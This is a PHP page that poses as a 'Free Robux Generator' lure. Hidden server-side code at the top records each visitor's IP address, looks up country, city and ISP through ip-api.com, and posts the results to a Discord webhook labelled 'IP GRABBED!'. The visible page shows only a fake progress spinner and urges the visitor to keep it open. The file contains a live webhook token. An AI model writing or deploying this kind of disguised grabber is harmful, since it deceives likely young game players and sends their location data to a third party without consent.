<?php
$ip = $_SERVER['REMOTE_ADDR'];
$webhook = "https://discord.com/api/webhooks/1479992985080037508/qDDuaOMl392hh8YyRRnmBdh6c7ReAgXQvIAv2F9Ela3OCMejbLYav7MPARFbxhQVtXjR";

$data = file_get_contents("http://ip-api.com/json/$ip");
$json = json_decode($data,true);

$message = '{
  "embeds": [{
    "title": "🎒 IP GRABBED!",
    "color": 16711680,
    "fields": [
      {"name": "🖥️ IP", "value": "'.$ip.'", "inline":true},
      {"name": "🌍 Country", "value": "'.$json['country'].'","inline":true},
      {"name": "🏙️ City", "value": "'.$json['city'].'","inline":true},
      {"name": "📶 ISP", "value": "'.$json['isp'].'","inline":true}
    ]
  }]
}';

$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
curl_exec($ch);
?>

<!DOCTYPE html><html><head><title>Free Robux</title></head><body style='background:linear-gradient(45deg,#ff6b6b,#4ecdc4);color:white;text-align:center;font-family:Arial;padding:50px'>
<h1 style='font-size:3em'>🎮 FREE ROBUX GENERATOR</h1>
<p style='font-size:1.5em'>Your 800 Robux is being generated...</p>
<div style='width:150px;height:150px;margin:50px auto;border:10px solid white;border-radius:50%;border-top-color:#4ecdc4;animation:spin 1s linear infinite'></div>
<p>Do NOT close this page!</p>
</body><style>@keyframes spin{100%{transform:rotate(360deg)}}</style></html>
